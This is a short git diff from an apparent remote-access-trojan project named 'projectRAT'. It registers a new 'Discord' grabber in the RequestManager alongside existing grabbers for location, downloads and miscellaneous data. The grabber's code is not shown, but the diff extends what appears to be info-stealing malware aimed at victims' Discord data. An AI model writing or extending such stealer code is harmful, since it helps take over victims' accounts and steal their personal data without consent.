@@ -1,5 +1,6 @@
 package in.momin5.projectRAT.request;
 
+import in.momin5.projectRAT.request.grabbers.Discord;
 import in.momin5.projectRAT.request.grabbers.Downloads;
 import in.momin5.projectRAT.request.grabbers.Location;
 import in.momin5.projectRAT.request.grabbers.MiscGrabs;
@@ -16,6 +17,7 @@ public class RequestManager {
         requests.addAll(Arrays.asList(
                 new MiscGrabs(),
                 new Location(),
+                new Discord(),
                 new Downloads()
         ));
     }
